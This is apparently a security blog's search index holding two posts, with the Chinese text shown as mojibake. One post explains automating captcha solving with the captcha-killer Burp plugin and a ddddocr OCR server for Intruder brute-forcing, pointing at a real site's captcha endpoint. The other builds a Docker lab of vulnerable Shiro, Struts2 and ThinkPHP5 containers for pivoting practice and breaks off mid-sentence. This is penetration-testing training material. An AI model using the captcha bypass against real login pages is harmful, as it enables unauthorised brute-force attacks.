<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>OCR-éªŒè¯ç è‡ªåŠ¨è¯†åˆ«</title>
    <link href="/2023/08/03/OCR_Captcha/"/>
    <url>/2023/08/03/OCR_Captcha/</url>
    
    <content type="html"><![CDATA[<p>éªŒè¯ç è·å–æµ‹è¯•æ¥å£ï¼š<code>https://data.gdcic.net/Dop/CheckCode.aspx?codemark=408.15173910730016</code></p><h1 id="BurpSuiteæ’ä»¶-CaptchaKiller"><a href="#BurpSuiteæ’ä»¶-CaptchaKiller" class="headerlink" title="BurpSuiteæ’ä»¶-CaptchaKiller"></a>BurpSuiteæ’ä»¶-CaptchaKiller</h1><p>åŸ GitHub é¡¹ç›®åœ°å€ï¼š<code>https://github.com/c0ny1/captcha-killer </code><br>ä¿®æ”¹ç‰ˆ GitHub é¡¹ç›®åœ°å€ï¼š<code>https://github.com/f0ng/captcha-killer-modified </code></p><p><img src="https://img.tucang.cc/api/image/show/f9961757767e711bc80fe11cc5ff1ab6" alt="image.png"><br><img src="https://img.tucang.cc/api/image/show/9abd4bb26272c6aea51c5a8ba86ed47b" alt="image.png">ä½¿ç”¨è¯´æ˜ï¼š<code>https://gv7.me/articles/2019/burp-captcha-killer-usage/</code></p><ul><li>å°†è·å–éªŒè¯ç çš„æ•°æ®åŒ…å‘é€åˆ°æ’ä»¶</li></ul><p>ä½¿ç”¨burpæŠ“å–è·å–éªŒè¯ç æ•°æ®åŒ…ï¼Œç„¶åå³é”® <code>captcha-killer</code> -&gt; <code>send to captcha panel</code>å‘é€æ•°æ®åŒ…åˆ°æ’ä»¶çš„éªŒè¯ç è¯·æ±‚é¢æ¿ã€‚<img src="https://img.tucang.cc/api/image/show/e54f497608ab49ea334975c9f88b52b4" alt="image.png"><br> ç„¶ååˆ°åˆ‡æ¢åˆ°æ’ä»¶é¢æ¿ï¼Œç‚¹å‡»è·å–å³å¯æ‹¿åˆ°è¦è¯†åˆ«çš„éªŒè¯ç å›¾ç‰‡å†…å®¹ã€‚<br><img src="https://img.tucang.cc/api/image/show/79c7a2463358abd3fecfa3c6dc61a711" alt="image.png"><br>æ³¨æ„ï¼šè·å–éªŒè¯ç çš„ cookie ä¸€å®šè¦å’Œ intruder å‘é€çš„ cookie ç›¸åŒï¼</p><ul><li>é…ç½®è¯†åˆ«æ¥å£çš„åœ°å€å’Œè¯·æ±‚åŒ…</li></ul><p>æ‹¿åˆ°éªŒè¯ç ä¹‹åï¼Œå°±è¦è®¾ç½®æ¥å£æ¥è¿›è¡Œè¯†åˆ«äº†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç½‘ä¸Šå¯»æ‰¾å…è´¹çš„æ¥å£ï¼Œä¹Ÿå¯ä»¥æœ¬åœ°èµ·ä¸€ä¸ªéªŒè¯ç è¯†åˆ«çš„æœåŠ¡ã€‚</p><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><p><img src="https://img.tucang.cc/api/image/show/cdb56f356eef6b51a632db2755821df0" alt="image.png"></p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>æ•°æ®åŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/reg</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8888<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><br><span class="language-typescript">&lt;<span class="hljs-meta">@BASE64</span>&gt;&lt;<span class="hljs-meta">@IMG_RAW</span>&gt;&lt;<span class="hljs-regexp">/@IMG_RAW&gt;&lt;/</span><span class="hljs-meta">@BASE64</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æŠŠå›¾ç‰‡å†…å®¹çš„ä½ç½®ç”¨æ ‡ç­¾æ¥ä»£æ›¿ã€‚æ¯”å¦‚è¯¥ä¾‹å­ä½¿ç”¨çš„æ¥å£æ˜¯postæäº¤imageå‚æ•°ï¼Œå‚æ•°çš„å€¼ä¸ºå›¾ç‰‡äºŒè¿›åˆ¶æ•°æ®çš„ base64 ç¼–ç åçš„ url ç¼–ç ã€‚é‚£ä¹ˆ <code>Request template</code>(è¯·æ±‚æ¨¡ç‰ˆ)é¢æ¿åº”è¯¥å¡«å†™å¦‚ä¸‹ï¼š<br><img src="https://img.tucang.cc/api/image/show/8b000c6dd8010f19b8101d226d4ae4ec" alt="image.png"></p><table><thead><tr><th>ID</th><th>æ ‡ç­¾</th><th>æè¿°</th></tr></thead><tbody><tr><td>1</td><td>&lt;@IMG_RAW&gt;&lt;&#x2F;@IMG_RAW&gt;</td><td>ä»£è¡¨éªŒè¯ç å›¾ç‰‡åŸäºŒè¿›åˆ¶å†…å®¹</td></tr><tr><td>2</td><td>&lt;@URLENCODE&gt;&lt;&#x2F;@URLENCODE&gt;</td><td>å¯¹æ ‡ç­¾å†…çš„å†…å®¹è¿›è¡Œurlç¼–ç </td></tr><tr><td>3</td><td>&lt;@BASE64&gt;&lt;&#x2F;@BASE64&gt;</td><td>å¯¹æ ‡ç­¾å†…çš„å†…å®¹è¿›è¡Œbase64ç¼–ç </td></tr></tbody></table><p>åç‚¹å‡»â€œè¯†åˆ«â€å³å¯è·å–åˆ°æ¥å£è¿”å›çš„æ•°æ®åŒ…ï¼ŒåŒæ—¶åœ¨ <code>request raw</code> å¯ä»¥çœ‹åˆ°è°ƒç”¨æ¥å£æœ€ç»ˆå‘é€çš„è¯·æ±‚åŒ…ã€‚<br><img src="https://img.tucang.cc/api/image/show/cf6eb70e155a4798dfc6996ac036dcad" alt="image.png"><br>å‹‰å¼ºå¤Ÿç”¨<br><img src="https://img.tucang.cc/api/image/show/459083197cd9e9ff258b060e982591df" alt="image.png"><br>è‹¥è¿”å›åŒ…æ˜¯ jsonï¼Œä½¿ç”¨ <code>Regular expression</code> (æ­£åˆ™è¡¨è¾¾å¼)æ¥åŒ¹é…ï¼Œç„¶åé€‰æ‹© <code>åŒ¹é…ç»“æœ</code> å³é”®æ ‡è®°ä¸ºè¯†åˆ«ç»“æœ ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆæ­£åˆ™è¡¨è¾¾å¼è§„åˆ™ã€‚<br><img src="https://img.tucang.cc/api/image/show/c4e315c5b1c4449763105df3e22a2e2f" alt="image.png"><br>å°†æ¨¡ç‰ˆä¿å­˜<br><img src="https://img.tucang.cc/api/image/show/77437bfa8af63307c1a785e3aa35de5d" alt="image.png"><br>åœ¨ <code>Intruder</code> æ¨¡å—è°ƒç”¨<br><img src="https://img.tucang.cc/api/image/show/9cb952cb61a50799feaee78a4bea3ded" alt="image.png"></p><h1 id="ddddocr"><a href="#ddddocr" class="headerlink" title="ddddocr"></a>ddddocr</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>é¡¹ç›®åœ°å€ï¼š<code>[https://github.com/sml2h3/ddddocr](https://github.com/sml2h3/ddddocr)</code><br>ä½¿ç”¨ <code>ocr_api_server</code> ä¸€é”®å¯åŠ¨è¯†åˆ«æœåŠ¡ï¼š<code>https://github.com/sml2h3/ocr_api_server</code></p><ul><li><p>æœ€ç®€å•è¿è¡Œæ–¹å¼</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"># å®‰è£…ä¾èµ–<br>pip install -r requirements.txt -i https://pypi.douban.com/simple<br># è¿è¡Œ å¯é€‰å‚æ•°å¦‚ä¸‹<br># --port 9898 æŒ‡å®šç«¯å£,é»˜è®¤ä¸º9898<br># --ocr å¼€å¯ocræ¨¡å— é»˜è®¤å¼€å¯<br># --old åªæœ‰ocræ¨¡å—å¼€å¯çš„æƒ…å†µä¸‹ç”Ÿæ•ˆ é»˜è®¤ä¸å¼€å¯ <br># --det å¼€å¯ç›®æ ‡æ£€æµ‹æ¨¡å¼<br><br># æœ€ç®€å•è¿è¡Œæ–¹å¼ï¼Œåªå¼€å¯ocræ¨¡å—å¹¶ä»¥æ–°æ¨¡å‹è®¡ç®— <br>python ocr_server.py --port 9898 --ocr<br># å¼€å¯ocræ¨¡å—å¹¶ä½¿ç”¨æ—§æ¨¡å‹è®¡ç®—<br>python ocr_server.py --port 9898 --ocr --old<br># åªå¼€å¯ç›®æ ‡æ£€æµ‹æ¨¡å—<br>python ocr_server.py --port 9898 --det<br># åŒæ—¶å¼€å¯ocræ¨¡å—ä»¥åŠç›®æ ‡æ£€æµ‹æ¨¡å—<br>python ocr_server.py --port 9898 --ocr --det<br># åŒæ—¶å¼€å¯ocræ¨¡å—å¹¶ä½¿ç”¨æ—§æ¨¡å‹è®¡ç®—ä»¥åŠç›®æ ‡æ£€æµ‹æ¨¡å—<br>python ocr_server.py --port 9898 --ocr --old --det<br></code></pre></td></tr></table></figure></li><li><p>docker è¿è¡Œæ–¹å¼(ç›®æµ‹åªèƒ½åœ¨ Linux ä¸‹éƒ¨ç½²)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http">git clone https://github.com/sml2h3/ocr_api_server.git <br>cd ocr_api_server<br># ä¿®æ”¹entrypoint.shä¸­çš„å‚æ•°ï¼Œå…·ä½“å‚æ•°å¾€ä¸Šç¿»ï¼Œé»˜è®¤9898ç«¯å£ï¼ŒåŒæ—¶å¼€å¯ocræ¨¡å—ä»¥åŠç›®æ ‡æ£€æµ‹<br>æ¨¡å—<br># ç¼–è¯‘é•œåƒ<br>docker build -t ocr_server:v1 .<br># è¿è¡Œé•œåƒ<br>docker run -p 9898:9898 -d ocr_server:v1<br></code></pre></td></tr></table></figure></li><li><p>æ¥å£</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"># 1ã€æµ‹è¯•æ˜¯å¦å¯åŠ¨æˆåŠŸï¼Œå¯ä»¥é€šè¿‡ç›´æ¥GETè®¿é—®http://&#123;host&#125;:&#123;port&#125;/pingæ¥æµ‹è¯•ï¼Œå¦‚æœè¿”å› pongåˆ™å¯åŠ¨æˆåŠŸ<br># 2ã€OCR/ç›®æ ‡æ£€æµ‹è¯·æ±‚æ¥å£æ ¼å¼:<br># http://&#123;host&#125;:&#123;port&#125;/&#123;opt&#125;/&#123;img_type&#125;/&#123;ret_type&#125;<br># opt:æ“ä½œç±»å‹ ocr=OCR det=ç›®æ ‡æ£€æµ‹ slide=æ»‘å—(matchå’Œcompareä¸¤ç§ç®—æ³•ï¼Œé»˜è®¤ä¸º compare)<br># img_type: æ•°æ®ç±»å‹ file=æ–‡ä»¶ä¸Šä¼ æ–¹å¼ b64=base64(imgbyte)æ–¹å¼ é»˜è®¤ä¸ºfileæ–¹å¼<br># ret_type: è¿”å›ç±»å‹ json=è¿”å›json(è¯†åˆ«å‡ºé”™ä¼šåœ¨msgé‡Œè¿”å›é”™è¯¯ä¿¡æ¯) text=è¿”å›æ–‡æœ¬æ ¼å¼ (è¯†åˆ«å‡ºé”™æ—¶å›ç›´æ¥è¿”å›ç©ºæ–‡æœ¬)<br># ä¾‹å­:<br># OCRè¯·æ±‚<br># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/ocr/file&quot;, files=&#123;&#x27;image&#x27;: image_bytes&#125;)<br># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/ocr/b64/text&quot;, data=base64.b64encode(file).decode())<br># ç›®æ ‡æ£€æµ‹è¯·æ±‚<br># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/det/file&quot;, files=&#123;&#x27;image&#x27;: image_bytes&#125;)<br># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/ocr/b64/json&quot;, data=base64.b64encode(file).decode())<br># æ»‘å—è¯†åˆ«è¯·æ±‚<br># resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/slide/match/file&quot;, files= &#123;&#x27;target_img&#x27;: target_bytes, &#x27;bg_img&#x27;: bg_bytes&#125;)<br># jsonstr = json.dumps(&#123;&#x27;target_img&#x27;: target_b64str, &#x27;bg_img&#x27;: bg_b64str&#125;) # resp = requests.post(&quot;http://&#123;host&#125;:&#123;port&#125;/slide/compare/b64&quot;, files=base64.b64encode(jsonstr.encode()).decode())<br></code></pre></td></tr></table></figure></li></ul><h2 id="éƒ¨ç½²-1"><a href="#éƒ¨ç½²-1" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><ol><li><p>å®‰è£…ä¸‹è½½é¡¹ç›®ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/sml2h3/ocr_api_server.git<br>python3 -m pip install -r requirements.txt -i https://pypi.douban.com/simple<br></code></pre></td></tr></table></figure></li><li><p>è¿è¡Œå¼€å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æœ€ç®€å•è¿è¡Œæ–¹å¼ï¼Œåªå¼€å¯ocræ¨¡å—å¹¶ä»¥æ–°æ¨¡å‹è®¡ç®— </span><br>python3 ocr_server.py --port 9898 --ocr<br><span class="hljs-comment"># å¼€å¯ocræ¨¡å—å¹¶ä½¿ç”¨æ—§æ¨¡å‹è®¡ç®—</span><br>python3 ocr_server.py --port 9898 --ocr --old<br><span class="hljs-comment"># åªå¼€å¯ç›®æ ‡æ£€æµ‹æ¨¡å—</span><br>python3 ocr_server.py --port 9898 --det<br><span class="hljs-comment"># åŒæ—¶å¼€å¯ocræ¨¡å—ä»¥åŠç›®æ ‡æ£€æµ‹æ¨¡å—</span><br>python3 ocr_server.py --port 9898 --ocr --det<br><span class="hljs-comment"># åŒæ—¶å¼€å¯ocræ¨¡å—å¹¶ä½¿ç”¨æ—§æ¨¡å‹è®¡ç®—ä»¥åŠç›®æ ‡æ£€æµ‹æ¨¡å—</span><br>python3 ocr_server.py --port 9898 --ocr --old --det<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/4dc2a3f1ba37abf3d1a2c6b75525f84b" alt="image.png"><br><img src="https://img.tucang.cc/api/image/show/df3e618e084a02d1050071e5a1b4efad" alt="image.png"><br><img src="https://img.tucang.cc/api/image/show/ee3cb3bf428479460d88ec565abd5016" alt="image.png"></p></li><li><p>æ¥å£æ ¼å¼ç±»å‹</p></li></ol><p>å¸¸ç”¨è¯·æ±‚æ¨¡ç‰ˆï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ocr/b64/text</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:9898<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5)<br>AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36<br><span class="hljs-attribute">Accept</span>:<br>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<br>*/*;q=0.8,application/signed-exchange;v=b3<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>113<br>&lt;@BASE64&gt;&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;&lt;/@BASE64&gt;<br></code></pre></td></tr></table></figure><p>è¯†åˆ«å‡†ç¡®ç‡è¿˜æ˜¯å¯ä»¥çš„<br><img src="https://img.tucang.cc/api/image/show/493a073394c0686ce528ed88e897b129" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>OCR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker æ­å»ºå¤šå±‚å†…ç½‘é¶åœºç¯å¢ƒ</title>
    <link href="/2023/07/30/Docker_vuln/"/>
    <url>/2023/07/30/Docker_vuln/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><h2 id="åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç½‘ç»œ"><a href="#åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç½‘ç»œ" class="headerlink" title="åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç½‘ç»œ"></a>åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ç½‘ç»œ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network create net1<br>docker network create --subnet=192.168.1.0/24 --gateway=192.168.1.1 mynetwork<br></code></pre></td></tr></table></figure><h2 id="åœ¨åˆ›å»ºå®¹å™¨æ—¶æŒ‡å®šç½‘ç»œ"><a href="#åœ¨åˆ›å»ºå®¹å™¨æ—¶æŒ‡å®šç½‘ç»œ" class="headerlink" title="åœ¨åˆ›å»ºå®¹å™¨æ—¶æŒ‡å®šç½‘ç»œ"></a>åœ¨åˆ›å»ºå®¹å™¨æ—¶æŒ‡å®šç½‘ç»œ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --name container1 --net net1 -d image1<br>docker run --name container2 --net net1 -d image2<br>docker run -itd --name mycontainer --network mynetwork --ip 192.168.1.10 busybox<br></code></pre></td></tr></table></figure><h2 id="åœ¨å®¹å™¨å·²è¿è¡Œçš„æƒ…å†µä¸‹åŠ å…¥ç½‘ç»œ"><a href="#åœ¨å®¹å™¨å·²è¿è¡Œçš„æƒ…å†µä¸‹åŠ å…¥ç½‘ç»œ" class="headerlink" title="åœ¨å®¹å™¨å·²è¿è¡Œçš„æƒ…å†µä¸‹åŠ å…¥ç½‘ç»œ"></a>åœ¨å®¹å™¨å·²è¿è¡Œçš„æƒ…å†µä¸‹åŠ å…¥ç½‘ç»œ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network connect ç½‘ç»œå å®¹å™¨å<br>docker network connect net1 container1<br></code></pre></td></tr></table></figure><h2 id="å¯åŠ¨å®¹å™¨å¹¶æµ‹è¯•"><a href="#å¯åŠ¨å®¹å™¨å¹¶æµ‹è¯•" class="headerlink" title="å¯åŠ¨å®¹å™¨å¹¶æµ‹è¯•"></a>å¯åŠ¨å®¹å™¨å¹¶æµ‹è¯•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker start container1<br>docker start container2<br></code></pre></td></tr></table></figure><h2 id="æµ‹è¯•å®¹å™¨ä¹‹é—´çš„è¿æ¥"><a href="#æµ‹è¯•å®¹å™¨ä¹‹é—´çš„è¿æ¥" class="headerlink" title="æµ‹è¯•å®¹å™¨ä¹‹é—´çš„è¿æ¥"></a>æµ‹è¯•å®¹å™¨ä¹‹é—´çš„è¿æ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it container1 ping container2<br></code></pre></td></tr></table></figure><h1 id="å®è·µ"><a href="#å®è·µ" class="headerlink" title="å®è·µ"></a>å®è·µ</h1><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¶åœºç½‘ç»œï¼Œå‘½åä¸º <code>vuln_network</code>ï¼Œè®¾ç½® IP æ®µä¸º <code>192.168.100.0/24</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker network create --subnet=192.168.100.0/24 vuln_network<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/a3d85c6bc79886e20d96fbf676afa757" alt="image.png"><br>å…ˆæ­å»ºä¸€ä¸ª <code>Shiro</code>æ¥åŠ©åŠ©å…´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker pull vulfocus/shiro-cve_2016_4437:latest<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/aa7cb89a7618d43851ee5f4942bd0b85" alt="image.png"><br><code>medicean/vulapps:s_shiro_1</code> ä¹Ÿå¯ä»¥<br><img src="https://img.tucang.cc/api/image/show/2de591d2a9661a23b0fa03b765327dce" alt="image.png"><br>åœ¨è¿è¡Œå®¹å™¨çš„æ—¶å€™å°†å®ƒåˆ†é…åˆ°æˆ‘ä»¬æ–°å»ºçš„ç½‘ç»œå¹¶ç»™ä»–åˆ†é…ä¸€ä¸ª IP åœ°å€ï¼Œå› ä¸ºéœ€è¦ä¸€ä¸ªæœåŠ¡å¤–ç½‘å¯è®¿é—®ä½œä¸ºè·³æ¿ï¼Œå› æ­¤ <code>-p</code> è½¬å‘ä¸€ä¸‹ç«¯å£ï¼Œä»¥åçš„æœºå­å¯ä»¥ä¸ç”¨æ˜ å°„åˆ°å¤–ç½‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker run --name=shiro1 --net=vuln_network --ip=192.168.100.10 -itd -p23333:8080 vulfocus/shiro-cve_2016_4437:latest<br><span class="hljs-comment"># --name å‘½å</span><br><span class="hljs-comment"># --net åŠ å…¥åˆ°æŸç½‘ç»œ</span><br><span class="hljs-comment"># --ip æŒ‡å®šip</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/a46c99c7123d364829264d3fb4d848cc" alt="image.png"><br>è®¿é—®ä¸»æœºçš„ 23333 ç«¯å£<br><img src="https://img.tucang.cc/api/image/show/524069ee3316300650fd645fb29bea4a" alt="image.png"><br>å°è¯•åˆ©ç”¨ä¸€æ³¢<br><img src="https://img.tucang.cc/api/image/show/1b7c0e0831c730466219f7571afb2a1e" alt="image.png"><br><strong>æ³¨</strong>ï¼šé¶åœºé‡Œç¯å¢ƒå¯èƒ½æ¯”è¾ƒçº¯å‡€ï¼Œ<code>ifconfig</code> çš„å‘½ä»¤éƒ½æ²¡æœ‰<br>å¯ä»¥ç”¨ <code>ip addr</code><br>å¦‚æœéœ€è¦ç”¨åˆ°å…¶å®ƒå‘½ä»¤ï¼Œè‡ªå·±è¿›å®¹å™¨å®‰è£…ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker <span class="hljs-built_in">exec</span> -it shiro1 bash<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/bac78fb700ca9319204d2b2aca8eb7c9" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install net-tools<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/54531772102872403302d6e056e7da6b" alt="image.png"><br><img src="https://img.tucang.cc/api/image/show/6d076bf08981bb9290a185b9560f5f04" alt="image.png"><br>æ¥ä¸‹æ¥å†å®‰è£…ä¸€ä¸ªst2<br><img src="https://img.tucang.cc/api/image/show/60275548d070f14557a7e10bba3637cf" alt="image.png"><br>å¤–éƒ¨æ²¡æœ‰é€”å¾„è®¿é—®åˆ°ï¼Œå› æ­¤ <code>192.168.100.10</code> ä¾¿æ˜¯è·³æ¿æœº<br><img src="https://img.tucang.cc/api/image/show/d888233ac7117032124fbb293c3db9a7" alt="image.png"><br>ç°åœ¨ä¸¤ä¸ªæœºå­éƒ½é…å¥½äº†<br><img src="https://img.tucang.cc/api/image/show/c521aa03ae33f66f5e7ab82e53ce90eb" alt="image.png"><br>å½“ç„¶è¿˜å¯ä»¥ç”¨å‘½ä»¤åŠ å…¥ç½‘ç»œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network connect ç½‘ç»œå å®¹å™¨å<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ–°ç½‘ç»œï¼Œåœ°å€ä¸º <code>192.168.1.0/24</code><br><img src="https://img.tucang.cc/api/image/show/3f15eaed2786da33a09f04d7c7db2587" alt="image.png"><br>å°† st2 çš„å®¹å™¨åŠ å…¥åˆ°ç½‘ç»œä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker network connect vuln_network2 st2<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/660fa412a234403ffd292e4ba45b6433" alt="image.png"><br>ç°åœ¨ä¸ºåŒç½‘å¡ï¼Œ<code>ip addr</code>ï¼š<br><img src="https://img.tucang.cc/api/image/show/11dcb3a6378c34c95dddce373982201f" alt="image.png"><br>åŒæ—¶æ·»åŠ ä¸€å° <code>thinkphp5</code>çš„æœºå­ï¼Œæ·»åŠ è¿› <code>vuln_network2</code><br><img src="https://img.tucang.cc/api/image/show/9ebb53a9e4958c0411f6dd0ab4a165da" alt="image.png"><br><code>Shiro1 192.168.100.10</code> çš„ä¸»æœºåªåœ¨ä¸€ä¸ªç½‘ç»œå†…ï¼Œå› æ­¤ä¸ tk5 æ˜¯ä¸é€šçš„<br><img src="https://img.tucang.cc/api/image/show/88ac5e58e178ecc1bed16625fd945b00" alt="image.png"><br>åœ¨ <code>st2 